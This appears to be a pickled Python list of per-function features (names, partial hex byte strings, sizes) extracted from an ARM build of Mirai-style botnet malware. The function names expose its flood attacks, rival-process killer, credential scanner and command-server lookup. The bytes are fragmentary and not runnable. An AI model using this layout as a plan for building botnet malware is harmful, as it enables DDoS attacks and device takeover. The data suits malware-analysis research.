(lp0
(S'.init_proc'
p1
S'0ddfe200eb2aebaf1b'
p2
L24L
tp3
a(S'ioctl'
p4
S'00'
p5
L12L
tp6
a(S'recv'
p7
S'00'
p8
L12L
tp9
a(S'connect'
p10
S'00'
p11
L12L
tp12
a(S'sigemptyset'
p13
S'00'
p14
L12L
tp15
a(S'memmove'
p16
S'00'
p17
L12L
tp18
a(S'getpid'
p19
S'00'
p20
L12L
tp21
a(S'prctl'
p22
S'00'
p23
L12L
tp24
a(S'memcpy'
p25
S'00'
p26
L12L
tp27
a(S'readlink'
p28
S'00'
p29
L12L
tp30
a(S'malloc'
p31
S'00'
p32
L12L
tp33
a(S'sleep'
p34
S'00'
p35
L12L
tp36
a(S'recvfrom'
p37
S'00'
p38
L12L
tp39
a(S'socket'
p40
S'00'
p41
L12L
tp42
a(S'select'
p43
S'00'
p44
L12L
tp45
a(S'readdir'
p46
S'00'
p47
L12L
tp48
a(S'sigaddset'
p49
S'00'
p50
L12L
tp51
a(S'send'
p52
S'00'
p53
L12L
tp54
a(S'abort'
p55
S'00'
p56
L12L
tp57
a(S'accept'
p58
S'00'
p59
L12L
tp60
a(S'calloc'
p61
S'00'
p62
L12L
tp63
a(S'write'
p64
S'00'
p65
L12L
tp66
a(S'kill'
p67
S'00'
p68
L12L
tp69
a(S'bind'
p70
S'00'
p71
L12L
tp72
a(S'inet_addr'
p73
S'00'
p74
L12L
tp75
a(S'chdir'
p76
S'00'
p77
L12L
tp78
a(S'setsockopt'
p79
S'00'
p80
L12L
tp81
a(S'signal'
p82
S'00'
p83
L12L
tp84
a(S'read'
p85
S'00'
p86
L12L
tp87
a(S'unlink'
p88
S'00'
p89
L12L
tp90
a(S'sendto'
p91
S'00'
p92
L12L
tp93
a(S'realloc'
p94
S'00'
p95
L12L
tp96
a(S'listen'
p97
S'00'
p98
L12L
tp99
a(S'fork'
p100
S'00'
p101
L12L
tp102
a(S'__uClibc_main'
p103
S'00'
p104
L12L
tp105
a(S'memset'
p106
S'00'
p107
L12L
tp108
a(S'getppid'
p109
S'00'
p110
L12L
tp111
a(S'time'
p112
S'00'
p113
L12L
tp114
a(S'opendir'
p115
S'00'
p116
L12L
tp117
a(S'getsockopt'
p118
S'00'
p119
L12L
tp120
a(S'__errno_location'
p121
S'00'
p122
L12L
tp123
a(S'exit'
p124
S'00'
p125
L12L
tp126
a(S'atoi'
p127
S'00'
p128
L12L
tp129
a(S'open'
p130
S'00'
p131
L12L
tp132
a(S'clock'
p133
S'00'
p134
L12L
tp135
a(S'setsid'
p136
S'00'
p137
L12L
tp138
a(S'closedir'
p139
S'00'
p140
L12L
tp141
a(S'fcntl'
p142
S'00'
p143
L12L
tp144
a(S'close'
p145
S'00'
p146
L12L
tp147
a(S'raise'
p148
S'00'
p149
L12L
tp150
a(S'free'
p151
S'00'
p152
L12L
tp153
a(S'sigprocmask'
p154
S'00'
p155
L12L
tp156
a(S'getsockname'
p157
S'00'
p158
L12L
tp159
a(S'__do_global_dtors_aux'
p160
S'30e900d50053e3800094e520e3000a833002a0e520e3'
p161
L104L
tp162
a(S'call___do_global_dtors_aux'
p163
S'042d'
p164
L8L
tp165
a(S'frame_dummy'
p166
S'3c9fe500042de51011'
p167
L68L
tp168
a(S'call_frame_dummy'
p169
S'042d'
p170
L8L
tp171
a(S'_start'
p172
S'00a0e420e500e5c00c9fe5'
p173
L44L
tp174
a(S'attack_app_http'
p175
S''
p176
L8240L
tp177
a(S'attack_get_opt_str'
p178
S'10e9ff00ff020050e300dad10253e1c007001a000ca0e5c0001a4091e500ea5ee1'
p179
L96L
tp180
a(S'attack_get_opt_ip'
p181
S'10e9ff00ff0200a0eb00010034'
p182
L48L
tp183
a(S'attack_get_opt_int'
p184
S'10e9ff00ff0200a0eb0002000aa0eb40a0e1'
p185
L52L
tp186
a(S'attack_start'
p187
g176
L224L
tp188
a(S'attack_parse'
p189
g176
L616L
tp190
a(S'attack_kill_all'
p191
g176
L60L
tp192
a(S'add_attack'
p193
S'702de1400001a0e3f6eb50a0e56080609fe5409fe510e511e510eb00e5518030e5'
p194
L88L
tp195
a(S'attack_init'
p196
S'042de310eb00e5'
p197
L132L
tp198
a(S'attack_gre_eth'
p199
g176
L1720L
tp200
a(S'attack_gre_ip'
p201
g176
L1604L
tp202
a(S'attack_tcp_stomp'
p203
g176
L2160L
tp204
a(S'attack_tcp_ack'
p205
g176
L1720L
tp206
a(S'attack_tcp_syn'
p207
g176
L1720L
tp208
a(S'attack_udp_plain'
p209
g176
L672L
tp210
a(S'attack_udp_generic'
p211
g176
L1256L
tp212
a(S'attack_udp_vse'
p213
g176
L1160L
tp214
a(S'attack_udp_dns'
p215
g176
L1808L
tp216
a(S'checksum_generic'
p217
S'0151e3c000a0e520e534e1c0100151e3'
p218
L96L
tp219
a(S'checksum_tcpudp'
p220
S'702de128e140800000a0dae0e330e520e534e1e0e010e200'
p221
L188L
tp222
a(S'mem_exists'
p223
S'10e903e10000a0da20e530e70000a01ac0001a00e80141e200f1'
p224
L92L
tp225
a(S'killer_kill'
p226
S'042de500e3e89d'
p227
L24L
tp228
a(S'killer_kill_by_port'
p229
g176
L1500L
tp230
a(S'killer_init'
p231
g176
L1748L
tp232
a(S'anti_gdb_entry'
p233
S'089fe530e5'
p234
L16L
tp235
a(S'teardown_connection'
p236
S'042de500e3e51b20e330e500eb'
p237
L44L
tp238
a(S'ensure_single_instance'
p239
S'702de240a0e500e120eb619fe500e3000aa0e510e330eb4096e500e320eb2be110eb30e500011383300502a0e550cd0c'
p240
L360L
tp241
a(S'main'
p242
g176
L2308L
tp243
a(S'resolve_cnc_addr'
p244
S'702de309eb00e308eb00eb60a0e309eb0070bde500eb409fe510e50beb31e500eb00eb00e308eb30e520e534e130e534e130e500eb'
p245
L140L
tp246
a(S'rand_next'
p247
S'3c9fe520e000e530e530e530e500e000e004e000'
p248
L68L
tp249
a(S'rand_str'
p250
S'30e900e2800300e3'
p251
L100L
tp252
a(S'rand_alphastr'
p253
S'702de250a0e100e520eb0000daa0e3009aa0e330e204e1c02153e530e420e3'
p254
L148L
tp255
a(S'rand_init'
p256
S'30e9cbe1eb30e5e1eb40a0eb509fe5402400e5e1eb30e530e030e5'
p257
L76L
tp258
a(S'resolv_skip_name'
p259
S'02a0e330e300ea0001d0028339018320ea52e330008c0053e3'
p260
L108L
tp261
a(S'resolv_entries_free'
p262
S'10e91094e500bd00eb'
p263
L36L
tp264
a(S'resolv_domain_to_hostname'
p265
S'30e901e100eb1000a0ea52e30000c4010130123012201420e20002a0e3'
p266
L112L
tp267
a(S'resolv_lookup'
p268
g176
L1212L
tp269
a(S'consume_any_prompt'
p270
S'00a0e5000050e300da30e5000011002453e3000a000d000f1a00ead3003a53130003002353e3000a001a00e3'
p271
L144L
tp272
a(S'can_consume'
p273
S'00a0e230e020e10083'
p274
L36L
tp275
a(S'scanner_kill'
p276
S'042de500e3'
p277
L24L
tp278
a(S'deobf'
p279
S'702de160a0eb00e2'
p280
L100L
tp281
a(S'add_auth_entry'
p282
g176
L300L
tp283
a(S'setup_connection'
p284
S'702de260a0e330e530e500e3'
p285
L208L
tp286
a(S'recv_strip_null'
p287
S'10e90c'
p288
L56L
tp289
a(S'scanner_init'
p290
g176
L6264L
tp291
a(S'table_retrieve_val'
p292
S'80e130e00004d0021130e5'
p293
L40L
tp294
a(S'toggle_obf'
p295
S'702de100e30ae130e030e5600222e1500322a0e2eca0e530e534e180048020e730e030e720e730e720e73002c120e730e030e710e520e534e100e9'
p296
L176L
tp297
a(S'table_lock_val'
p298
S'042de2'
p299
L16L
tp300
a(S'table_unlock_val'
p301
S'042de2'
p302
L16L
tp303
a(S'add_entry'
p304
g176
L72L
tp305
a(S'table_init'
p306
S'042de313e3'
p307
L808L
tp308
a(S'util_strlen'
p309
S'00a0e5000e'
p310
L40L
tp311
a(S'util_strncmp'
p312
g176
L100L
tp313
a(S'util_strcmp'
p314
S'702de150a0eb40a0e1'
p315
L92L
tp316
a(S'util_memcpy'
p317
S'0052e3'
p318
L36L
tp319
a(S'util_strcpy'
p320
S'702de150a0e1'
p321
L48L
tp322
a(S'util_zero'
p323
S'0051e3'
p324
L36L
tp325
a(S'util_itoa'
p326
g176
L232L
tp327
a(S'util_memsearch'
p328
S'30e902e1e0e10010000051e300da00e120e730e70000a01ac0001a00e80051e1'
p329
L100L
tp330
a(S'util_stristr'
p331
S'702de140a0e100ebe0e100e300ead541301953e310e2006020e1c0018c0c5ee1001a0070bde200'
p332
L124L
tp333
a(S'util_atoi'
p334
g176
L328L
tp335
a(S'util_fdgets'
p336
g176
L96L
tp337
a(S'util_local_addr'
p338
S'30e910a0e5d6'
p339
L160L
tp340
a(S'__udivsi3'
p341
S'0151e2'
p342
L248L
tp343
a(S'__aeabi_uidivmod'
p344
S'03e90640bde0100e'
p345
L24L
tp346
a(S'__umodsi3'
p347
S'0151e2003a0000a081'
p348
L204L
tp349
a(S'__modsi3'
p350
S'0051e3000a1000b00060420151e20000a081009a51e30001a032'
p351
L228L
tp352
a(S'__do_global_ctors_aux'
p353
S'289fe520e50010e910a0e120fa'
p354
L48L
tp355
a(S'call___do_global_ctors_aux'
p356
S'042d'
p357
L8L
tp358
a(S'.term_proc'
p359
S'0ddfe2d6'
p360
L20L
tp361
a.